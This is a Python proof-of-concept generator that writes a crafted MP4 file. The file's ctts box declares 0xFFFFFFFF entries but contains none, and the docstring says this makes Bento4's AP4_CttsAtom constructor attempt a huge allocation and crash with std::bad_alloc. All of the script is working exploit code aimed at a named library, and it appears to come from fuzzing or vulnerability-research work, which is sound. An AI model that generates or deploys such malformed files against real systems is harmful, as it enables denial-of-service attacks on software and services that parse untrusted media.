#!/usr/bin/env python3
"""
VULN 001 PoC Generator - AP4_CttsAtom missing entry_count bounds check

Crafts a minimal MP4 with a ctts box claiming entry_count=0xFFFFFFFF
but containing zero actual entries. When Bento4's AP4_CttsAtom constructor
calls AP4_Array::EnsureCapacity(0xFFFFFFFF), it tries to allocate ~32GB,
triggering std::bad_alloc (DoS).

ctts box lives at: moov/trak/mdia/minf/stbl/ctts
"""
import struct
import os

OUTPUT = "/data/ylwang/non-textfuzz/target/_poc/Bento4/Source_C++_Core_Ap4Interfaces_h/vuln_001.mp4"


def box(box_type: bytes, payload: bytes) -> bytes:
    """Build a 4-byte-size + 4-byte-type + payload box."""
    size = 8 + len(payload)
    return struct.pack('>I', size) + box_type + payload


# ---------------------------------------------------------------------------
# ftyp
# ---------------------------------------------------------------------------
ftyp_payload = (
    b'isom'               # major brand
    + struct.pack('>I', 0x0200)  # minor version
    + b'isom' + b'iso2' + b'mp41'  # compatible brands
)
ftyp = box(b'ftyp', ftyp_payload)


# ---------------------------------------------------------------------------
# ctts  — the malicious atom
# size=20 means: 8 (header) + 4 (version/flags) + 4 (entry_count) + 0 entries
# entry_count=0xFFFFFFFF but no entries follow
# ---------------------------------------------------------------------------
ctts_payload = struct.pack('>I', 0x00000000)  # version=0, flags=0
ctts_payload += struct.pack('>I', 0xFFFFFFFF)  # entry_count = 4294967295
# NO actual entries — the box ends here; Bento4 will try to read 0xFFFFFFFF
# entries and/or pre-allocate capacity for them
ctts = box(b'ctts', ctts_payload)


# ---------------------------------------------------------------------------
# stts  — 1 entry: (sample_count=1, sample_delta=1024)
# ---------------------------------------------------------------------------
stts_payload = struct.pack('>I', 0)   # version/flags
stts_payload += struct.pack('>I', 1)  # entry_count = 1
stts_payload += struct.pack('>I', 1)  # sample_count
stts_payload += struct.pack('>I', 1024)  # sample_delta
stts = box(b'stts', stts_payload)


# ---------------------------------------------------------------------------
# stsc  — 1 entry: (first_chunk=1, samples_per_chunk=1, sample_desc_index=1)
# ---------------------------------------------------------------------------
stsc_payload = struct.pack('>I', 0)
stsc_payload += struct.pack('>I', 1)   # entry_count
stsc_payload += struct.pack('>I', 1)   # first_chunk
stsc_payload += struct.pack('>I', 1)   # samples_per_chunk
stsc_payload += struct.pack('>I', 1)   # sample_description_index
stsc = box(b'stsc', stsc_payload)


# ---------------------------------------------------------------------------
# stsz  — 1 sample, size=4
# ---------------------------------------------------------------------------
stsz_payload = struct.pack('>I', 0)   # version/flags
stsz_payload += struct.pack('>I', 4)  # default_sample_size (non-zero => uniform)
stsz_payload += struct.pack('>I', 1)  # sample_count
stsz = box(b'stsz', stsz_payload)


# ---------------------------------------------------------------------------
# stco  — 1 chunk at offset 8 (ftyp region; we don't care about playback)
# ---------------------------------------------------------------------------
stco_payload = struct.pack('>I', 0)   # version/flags
stco_payload += struct.pack('>I', 1)  # entry_count
stco_payload += struct.pack('>I', 8)  # chunk_offset[0]
stco = box(b'stco', stco_payload)


# ---------------------------------------------------------------------------
# stsd  — minimal mp4a sample entry
# mp4a: 6 reserved bytes, 2-byte data_ref_index, 8 zero bytes,
#        channelcount=2, samplesize=16, 2 zero bytes, samplerate<<16
# ---------------------------------------------------------------------------
mp4a_inner = (
    b'\x00' * 6              # reserved
    + struct.pack('>H', 1)  # data_reference_index
    + b'\x00' * 8           # reserved
    + struct.pack('>H', 2)  # channelcount
    + struct.pack('>H', 16) # samplesize
    + b'\x00' * 2           # pre_defined
    + b'\x00' * 2           # reserved
    + struct.pack('>I', 44100 << 16)  # samplerate (fixed-point 16.16)
)
# Minimal esds box (just the header + empty payload to satisfy parsers)
esds_payload = struct.pack('>I', 0)  # version/flags
esds = box(b'esds', esds_payload)
mp4a = box(b'mp4a', mp4a_inner + esds)

stsd_payload = struct.pack('>I', 0)   # version/flags
stsd_payload += struct.pack('>I', 1)  # entry_count
stsd_payload += mp4a
stsd = box(b'stsd', stsd_payload)


# ---------------------------------------------------------------------------
# stbl
# ---------------------------------------------------------------------------
stbl = box(b'stbl', stsd + stts + stsc + stsz + stco + ctts)


# ---------------------------------------------------------------------------
# dinf / dref
# ---------------------------------------------------------------------------
url_payload = struct.pack('>I', 1)  # version=0, flags=1 (self-contained)
url = box(b'url ', url_payload)
dref_payload = struct.pack('>I', 0)   # version/flags
dref_payload += struct.pack('>I', 1)  # entry_count
dref_payload += url
dref = box(b'dref', dref_payload)
dinf = box(b'dinf', dref)


# ---------------------------------------------------------------------------
# smhd
# ---------------------------------------------------------------------------
smhd_payload = struct.pack('>I', 0)   # version/flags
smhd_payload += struct.pack('>H', 0)  # balance
smhd_payload += struct.pack('>H', 0)  # reserved
smhd = box(b'smhd', smhd_payload)


# ---------------------------------------------------------------------------
# minf
# ---------------------------------------------------------------------------
minf = box(b'minf', smhd + dinf + stbl)


# ---------------------------------------------------------------------------
# hdlr  — audio handler
# ---------------------------------------------------------------------------
hdlr_payload = struct.pack('>I', 0)   # version/flags
hdlr_payload += struct.pack('>I', 0)  # pre_defined
hdlr_payload += b'soun'               # handler_type
hdlr_payload += b'\x00' * 12         # reserved (3 x uint32)
hdlr_payload += b'SoundHandler\x00'  # name
hdlr = box(b'hdlr', hdlr_payload)


# ---------------------------------------------------------------------------
# mdhd  — media header (duration=0)
# ---------------------------------------------------------------------------
mdhd_payload = struct.pack('>I', 0)       # version/flags
mdhd_payload += struct.pack('>I', 0)      # creation_time
mdhd_payload += struct.pack('>I', 0)      # modification_time
mdhd_payload += struct.pack('>I', 44100)  # timescale
mdhd_payload += struct.pack('>I', 0)      # duration
mdhd_payload += struct.pack('>H', 0x15c7)  # language (und)
mdhd_payload += struct.pack('>H', 0)      # pre_defined
mdhd = box(b'mdhd', mdhd_payload)


# ---------------------------------------------------------------------------
# mdia
# ---------------------------------------------------------------------------
mdia = box(b'mdia', mdhd + hdlr + minf)


# ---------------------------------------------------------------------------
# tkhd  — track header (track_id=1, duration=0)
# ---------------------------------------------------------------------------
tkhd_payload = struct.pack('>I', 0x00000003)  # version=0, flags=3 (enabled+in-movie)
tkhd_payload += struct.pack('>I', 0)   # creation_time
tkhd_payload += struct.pack('>I', 0)   # modification_time
tkhd_payload += struct.pack('>I', 1)   # track_id
tkhd_payload += struct.pack('>I', 0)   # reserved
tkhd_payload += struct.pack('>I', 0)   # duration
tkhd_payload += b'\x00' * 8            # reserved
tkhd_payload += struct.pack('>H', 0)   # layer
tkhd_payload += struct.pack('>H', 0)   # alternate_group
tkhd_payload += struct.pack('>H', 0x0100)  # volume (1.0 fixed-point)
tkhd_payload += struct.pack('>H', 0)   # reserved
# Unity matrix (9 x 32-bit fixed)
tkhd_payload += struct.pack('>9i',
    0x00010000, 0, 0,
    0, 0x00010000, 0,
    0, 0, 0x40000000)
tkhd_payload += struct.pack('>I', 0)   # width
tkhd_payload += struct.pack('>I', 0)   # height
tkhd = box(b'tkhd', tkhd_payload)


# ---------------------------------------------------------------------------
# trak
# ---------------------------------------------------------------------------
trak = box(b'trak', tkhd + mdia)


# ---------------------------------------------------------------------------
# mvhd  — movie header
# ---------------------------------------------------------------------------
mvhd_payload = struct.pack('>I', 0)       # version/flags
mvhd_payload += struct.pack('>I', 0)      # creation_time
mvhd_payload += struct.pack('>I', 0)      # modification_time
mvhd_payload += struct.pack('>I', 1000)   # timescale
mvhd_payload += struct.pack('>I', 0)      # duration
mvhd_payload += struct.pack('>I', 0x00010000)  # rate (1.0)
mvhd_payload += struct.pack('>H', 0x0100)      # volume (1.0)
mvhd_payload += b'\x00' * 10             # reserved
mvhd_payload += struct.pack('>9i',       # unity matrix
    0x00010000, 0, 0,
    0, 0x00010000, 0,
    0, 0, 0x40000000)
mvhd_payload += b'\x00' * 24            # pre_defined
mvhd_payload += struct.pack('>I', 2)    # next_track_id
mvhd = box(b'mvhd', mvhd_payload)


# ---------------------------------------------------------------------------
# moov
# ---------------------------------------------------------------------------
moov = box(b'moov', mvhd + trak)


# ---------------------------------------------------------------------------
# Write the file
# ---------------------------------------------------------------------------
data = ftyp + moov

os.makedirs(os.path.dirname(OUTPUT), exist_ok=True)
with open(OUTPUT, 'wb') as f:
    f.write(data)

print(f"Written {len(data)} bytes to {OUTPUT}")
print(f"ctts entry_count = 0xFFFFFFFF ({0xFFFFFFFF}) with 0 actual entries")
